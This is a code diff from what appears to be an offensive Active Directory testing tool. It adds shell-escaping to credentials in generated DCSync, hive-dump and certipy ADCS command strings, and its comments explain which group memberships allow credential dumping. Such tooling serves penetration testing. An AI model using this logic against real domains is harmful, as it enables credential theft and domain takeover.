@@ -972,15 +972,18 @@ def run(report, store, ui=None):
                 if _s:
                     best_src, best_line = _s, _l
                     break
-            _dom_ac = store.dominant_domain() or "<dom>"
+            _dom_ac = _sh_sq(store.dominant_domain() or "<dom>")
             _dc_ac = store.dc_ip() or "<DC-IP>"
             via = admincount_via.get(ulc, "")
             via_note = f" via '{via}'" if via else " (admincount=1)"
             # iter-96: hash-only auth uses -hashes ':NT' impacket syntax.
+            # iter-129: shell-escape pw/user for auth-target emission.
             _is_hash_ac = pw.startswith(":")
+            _ulc_sh = _sh_sq(ulc)
+            _pw_sh_ac = _sh_sq(pw)
             _hash_flag = f" -hashes 'aad3b435b51404eeaad3b435b51404ee:{pw[1:]}'" if _is_hash_ac else ""
-            _auth_target = (f"'{_dom_ac}/{ulc}'@{_dc_ac}" if _is_hash_ac
-                            else f"'{_dom_ac}/{ulc}:{pw}'@{_dc_ac}")
+            _auth_target = (f"'{_dom_ac}/{_ulc_sh}'@{_dc_ac}" if _is_hash_ac
+                            else f"'{_dom_ac}/{_ulc_sh}:{_pw_sh_ac}'@{_dc_ac}")
             _summary_val = f"NT hash for {ulc}" if _is_hash_ac else f"{ulc}:{pw}"
             # iter-115: Backup/Server Operators do NOT hold DRSUAPI GetChanges
             # rights, so the standard secretsdump DCSync form fails. What they
@@ -993,8 +996,8 @@ def run(report, store, ui=None):
             _via_low = via.lower() if via else ""
             _is_bop_sop = _via_low in ("backup operators", "server operators")
             if _is_bop_sop:
-                _nxc_auth = (f"-u '{ulc}' -H {pw[1:]}" if _is_hash_ac
-                             else f"-u '{ulc}' -p '{pw}'")
+                _nxc_auth = (f"-u '{_ulc_sh}' -H {pw[1:]}" if _is_hash_ac
+                             else f"-u '{_ulc_sh}' -p '{_pw_sh_ac}'")
                 chains.append(Chain("R-ADMIN-CRED", "backup/server op -> hive dump",
                     f"{_summary_val} - {via.title()} member (no DCSync, use hive save)",
                     crit=10, conf=0.95, ready=1.4, prox=1.0,     # score 13.3
@@ -1523,10 +1526,12 @@ def run(report, store, ui=None):
         # iter-104: prefer plaintext when available; fall back to any known
         # NT hash for the authenticating principal (certipy-ad req accepts
         # -hashes ':NT'). Same pattern as R-CONSTRAINED / R-ADMIN-CRED.
+        # iter-129: shell-escape ADCS auth args.
         if e.creds:
             ((_ulc_ac, _pw_ac), _occs_ac) = next(iter(e.creds.items()))
             _disp_ac = _occs_ac[0][0] if _occs_ac[0][0] != "<user>" else _ulc_ac
-            _adcs_auth = f"-p '{_pw_ac}'"
+            _disp_ac = _sh_sq(_disp_ac)
+            _adcs_auth = f"-p '{_sh_sq(_pw_ac)}'"
         else:
             # pick the first hash whose user is known
             _pick = None
